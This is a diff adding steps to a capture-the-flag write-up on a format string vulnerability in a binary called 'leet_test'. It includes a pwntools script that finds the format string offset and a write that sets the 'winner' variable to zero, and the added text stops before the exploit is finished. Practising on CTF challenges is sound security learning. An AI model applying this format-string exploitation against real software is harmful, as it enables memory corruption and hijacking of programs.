@@ -158,4 +158,61 @@ for i in range(256): # random range
 
 
 21. Yep we got it, means we need to right 8 bytes before print any address. 
-22. 
+22. Now, we need to find the format strings offset. To do that i used `FmtStr`.
+
+> THE SCRIPT
+
+```py
+from pwn import *
+import os
+from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
+
+os.system('clear')
+
+exe = './leet_test'
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+sh = start()
+
+def sendPayload(p):
+    sh.sendline(p)
+    sh.recvuntil('Hello,')
+    return sh.recvline()
+
+## GET THE FORMAT STRING OFFSET
+formatString = FmtStr(execute_fmt = sendPayload)
+info("Format String Offset: %d", formatString.offset)
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/210161461-96d31b85-1e5c-4dce-a67e-7d4f94171e2a.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/210161501-f6a23d2b-a8fa-4261-af21-617ad8f71e0b.png)
+
+
+23. Got it at 10th iterations.
+24. Based from it we know that we need to write our value at offset of 10 to reference them.
+25. Let's write the `winner` value to 0, to do that, get the offset of winner.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210161539-d2659383-7333-41af-a0d2-05c69e133818.png)
+
+
+```py
+# using FmtStr
+formatString.write(0x404078, 0) # write 0 to winner
+```
+
+26. The issue now is overwriting the `urandom` value, because is not found somewhere in the memory to overwrite.
+27. To find that, we can leak the stack to find the offset.
